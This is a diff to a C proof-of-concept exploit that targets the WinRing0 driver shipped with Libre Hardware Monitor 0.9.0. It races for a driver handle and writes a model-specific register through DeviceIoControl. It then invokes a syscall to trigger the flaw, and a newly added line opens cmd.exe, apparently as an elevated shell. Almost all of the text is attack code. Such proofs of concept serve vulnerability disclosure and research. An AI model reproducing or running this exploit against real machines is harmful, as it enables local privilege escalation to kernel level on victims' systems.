@@ -16,7 +16,7 @@ int main(int argc, char** argv)
 
 	system("title poc | color f");
 
-	printf("[!] WinRing0 Proof-of-Concept Exploit\n[!] Written by ExAllocatePool2.\n[!] Lets exploit!\n[*] Racing to obtain a driver handle...");
+	printf("[!] Libre Hardware Monitor 0.9.0 Write To Model-Specific Registers Proof-of-Concept Exploit\n[!] Written by ExAllocatePool2.\n[!] Lets exploit!\n[*] Racing to obtain a driver handle...");
 
 	while (h_driver == (HANDLE)-1)
 	{
@@ -51,7 +51,12 @@ int main(int argc, char** argv)
 	DeviceIoControl(h_driver, IOCTL_WRITE_MSR, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
 	printf("\n[+] Wrote %lld (0x%p) to register %lu (0x%p).", input.Value.QuadPart, (PULONGLONG)input.Value.QuadPart, input.Register, (PULONGLONG)input.Register);
 
+	printf("\n[*] Invoking syscall instruction to trigger the vulnerability...");
+	Sleep(1000);
 	invoke_syscall();
+
+	system("start C:\\Windows\\System32\\cmd.exe");
+	printf("\n[+] Finished!");
 
 	unused = getchar();
 
